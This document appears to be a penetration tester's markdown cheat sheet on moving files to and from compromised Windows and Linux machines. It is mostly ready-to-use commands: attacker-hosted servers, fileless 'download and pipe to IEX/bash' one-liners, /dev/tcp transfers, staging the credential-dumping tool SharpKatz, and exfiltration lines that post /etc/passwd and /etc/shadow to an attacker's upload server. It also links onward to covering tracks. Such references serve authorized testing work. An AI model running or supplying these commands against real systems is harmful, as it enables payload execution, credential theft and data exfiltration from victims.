---
tags:
  - fileless-execution
  - "#pseudo-networks"
  - self-signed-certificates
---
> **!! NOTE:** User-Agent can be blocked for each tool when accessing remote resource. Refer GTFObins or LOLBAS to find available binaries to transfer data.
# Servers
## Python Server:
```shell-session
$ python3 -m http.server [<PORT>]
$ python2.7 -m SimpleHTTPServer
```
```shell-session
$ python3 -m uploadserver [<PORT>] --server-certificate ~/<key>.pem
```
Refer #self-signed-certificates to create such certs.
## SMB Server:
```shell-session
$ sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
$ sudo impacket-smbserver -smb2support share $(pwd) [-user ''] [-password '']
```
## Nginx Server
Create `/etc/nginx/sites-available/upload.conf` with the contents:
```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
```shell-session
$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
$ sudo systemctl restart nginx.service
```
## LDAP Server
```shell-session
$ java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
```
## FTP Server
```shell-session
$ python3 -m pyftpdlib -w
```
## PHP Server
```shell-session
$ php -S 0.0.0.0:8000
```
## Ruby Server
```shell-session
$ ruby -run -ehttpd . -p8000
```
## Netcat
```shell-session
$ nc -nlvp <PORT>
```
### OpenSSL
Refer #self-signed-certificates 
```shell-session
$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <file>
```
# Windows Client
## Net
- SMB
```powershell
> net use n: \\IP\shareName /user:test password
> copy n:\nc.exe
```
```Powershell
PS C:\> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
PS C:\> New-PSDrive -Name "Exfil" -PsProvider "Filesystem" -Root "\\10.10.14.195\share"
PS C:\> copy * Exfil:\
```
## Copy
```powershell
> copy \\IP[:PORT]\shareName\nc.exe
PS > copy-item "Target-File" \\IP[:PORT]\shareName\outputName
```
## Invoke-WebRequest
Alias: `iwr` and `wget`
```powershell
PS > wget <address> -o <outputFile>
# ... Specify the UseBasicParsing parameter and try again.
PS > Invoke-WebRequest https://<ip>[:PORT]/file -UseBasicParsing
```
## Certutil
```powershell
PS > certutil -urlcache -f http://IP:PORT/file file_local
```
>**!! Note:** AMSI detects this as malicious
### BITSadmin
```powershell
PS > bitsadmin /transfer wcb /priority foreground http://<IP>[:<PORT>]/file <file-to-send>
```
## Net.WebClient
- HTTP(s)
```powershell
PS > (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
# without blocking the calling thread.
PS > (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
- FTP
```powershell
PS > $webclient = New-Object System.Net.WebClient
PS > $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous@domain.com")
PS > $ftpUri = New-Object System.Uri("ftp://IP[:PORT]/file")
PS > $webclient.UploadFile($ftpUri, $localFilePath)

# Directly?
PS > (New-Object Net.WebClient).DownloadFile('ftp://IP[:PORT]/file', 'C:\Users\Public\ftp-file.txt')

# FTP Command File
> echo open <IP> > ftpcommand.txt
> echo USER anonymous >> ftpcommand.txt
> echo binary >> ftpcommand.txt
> echo GET file.txt >> ftpcommand.txt
> echo bye >> ftpcommand.txt
> ftp -v -n -s:ftpcommand.txt
```
- #fileless-execution
```powershell
PS > IEX (New-Object Net.WebClient).DownloadString('https://<IP>[:PORT]/path-to/script.ps1')
# OR PIPE IT
PS > (New-Object Net.WebClient).DownloadString('https://<IP>[:PORT]/path-to/script.ps1') | IEX
```
```powershell
# "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
PS > [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
## WinRM
```powershell
PS > Test-NetConnection -ComputerName DATABASE01 -Port 5985
PS > $Session = New-PSSession -ComputerName DATABASE01

Upload to Session
PS > Copy-Item -Path "Path\to\file" -ToSession $Session -Destination "Path\to\save"

PS > Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -FromSession $Session -Destination "C:\" 
```
## New-PSDrive
```powershell
> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
```
## CScript
- JavaScript
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
```cmd-session
> cscript.exe /nologo wget.js https://address.to/script.ps1 script.ps1
```
- VBScript
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
```cmd-session
> cscript.exe /nologo wget.vbs https://address.to/script.ps1 script.ps1
```
# Linux Client
## cURL
```shell-session
$ curl http://<IP>[:<PORT>]/file -o <output-file>
```
## Wget
```shell-session
$ wget http://<IP>[:<PORT>]/file
```
### OpenSSL
```shell-session
$ openssl s_client -connect <IP>:<PORT> -quiet > file
```
## Netcat
On Linux:
```shell-session
$ ncat -l -p <PORT> --recv-only > SharpKatz.exe
```
From Kali:
```shell-session
$ nc --send-only 0 <IP> <PORT> < SharpKatz.exe
```
## /dev/tcp
```shell-session
$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
## Python
```shell-session
$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://address.to/file", "file")'
$ python3 -c 'import urllib.request; urllib.request.urlretrieve("https://address.to/file", "file")'
```
## PHP
```shell-session
get_contents & put_contents
$ php -r '$file = file_get_contents("https://address.to/file"); file_put_contents("file",$file);'

fopen() module
$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://address.to/file", "rb"); $flocal = fopen("file", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
## Fileless-execution 
> **!! NOTE:** Some payloads such as `mkfifo` write files to disk. But while the execution of the payload may be fileless with pipes, depending on the payload chosen it may create temporary files on the OS.

- **cURL**
```shell-session
$ curl https://address.to/script.sh | bash
```
- **Wget**
```shell-session
$ wget -qO- https://address.to/script.py | python3
```
- PHP
```shell-session
$ php -r '$lines = @file("https://address.to/script.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
> **Note:** The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
- Ruby
```shell-session
$ ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("https://adress.to/file")))'
```
- Perl
```shell-session
$ perl -e 'use LWP::Simple; getstore("https://address.to/file", "file");'
```
- **/dev/tcp**
```shell-session
Connect to server
$ exec 3<>/dev/tcp/<IP>/<PORT>

GET Request & print response
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
$ cat <&3
```
> **Note**: Needs bash >2.04 compiled with `--enable-net-redirections`
- JavaScript

## SCP
> **Note**: Create temporary user to avoid saving personal creds in remote systems.
```shell-session
$ scp <user>@<IP>:/file/to/download /path/to/save
```
# Chisel
Server (Linux):
```shell-session
$ chisel server --reverse --socks5 -p 8001
```
Client (Windows)
```powershell
> .\chisel.exe client HACKER_IP:PORT R:socks
```

Can be used with `curl`:
```shell-session
$ curl -x socks5://127.0.0.1:LPORT https://127.0.0.1:RPORT
```

**Possible pathways after data-infiltration:**
- **[[Windows Privesc.]]**
# Exfiltration
## From Windows
### Base64
- From Windows
```powershell
PS > [Convert]::ToBase64String((Get-Content -path "C:\Path-to\file" -Encoding byte))
PS > Get-FileHash "C:\Path-to\file" -Algorithm MD5 | select Hash
```
-> On Kali
```shell-session
$ echo 'base64 string' | base64 -d
```
### Web Uploads
Create one from any [[#Servers]], and upload from Windows victim machine:
```powershell
PS > IEX(New-Object Net.WebClient).DownloadString('https://IP[:PORT]/Path-to/PSUpload.ps1')
PS > Invoke-FileUpload -Uri http://IP[:PORT]/upload -File C:\Path-to\file
```
```powershell
PS > Invoke-WebRequest -Uri 'http://<IP>[:<PORT>]/upload' -Method POST -InFile '.\file' -ContentType 'multipart/form-data'
PS > Invoke-RestMethod -Uri 'http://<IP>[:<PORT>]/upload' -Method POST -InFile '.\file' -ContentType 'multipart/form-data'
```
### CertReq
Used with [[#Servers#Netcat]]
```powershell
> certreq.exe -Post -config http://<IP>[:<PORT>]/ file
```
### BITSadmin
```powershell
PS > Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
### Base64 + WebRequest/RestMethod
```powershell
PS > $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Path-to\file' -Encoding Byte))
PS > Invoke-WebRequest -Uri http://IP[:PORT]/ -Method POST -Body $b64
```
-> On kali
```shell-session
$ nc -nlvp PORT
```
### FTP
```powershell
PS > (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/file', 'C:\Local\path\to\file'
```
## From Linux
### Web Upload
Create one from any [[#Servers]], and upload from victim machine
```shell-session
$ curl -X POST https://<IP>[:<PORT>]/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
`--insecure` if we use #self-signed-certificates 
```shell-session
$ curl -T <file> http://<IP>[:<PORT>]/SecretUploadDirectory/file
```
```shell-session
$ python3 -c 'import requests;requests.post("http://<IP>[:<PORT>]/upload",files={"files":open("file","rb")})'
```
### Web Download
- Create one from any [[#Servers]] present in victim, and download from attacker machine
# Limited Data Transfer
Windows command-line support upto 8,191 characters and the webshell may error out if sending large strings
-> From Kali:
```shell-session
$ cat id_rsa |base64 -w 0;echo
```
- In Windows
```powershell
PS > [IO.File]::WriteAllBytes("C:\Save\location", [Convert]::FromBase64String("<base64-string>")
```
Confirm with #md5 hashsum
# Protected Data Transfer
- `Invoke-AESEncryption`: Refer #aes KB for usage.
```powershell
PS > Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Text "<PLAIN>" 
PS > Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Text "<ENCRYPTED>"
PS > Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Path file.bin
PS > Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Path file.bin.aes
```
- OpenSSL
```shell-session
$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


# **Possible pathways after Exfil:**

| Pathway 1              | Pathway 2                    |
| ---------------------- | ---------------------------- |
| [[Covering Tracks]]         | [[Operation Plan#Reporting]] |
| Timestamp Modification | Stakeholder Communication    |
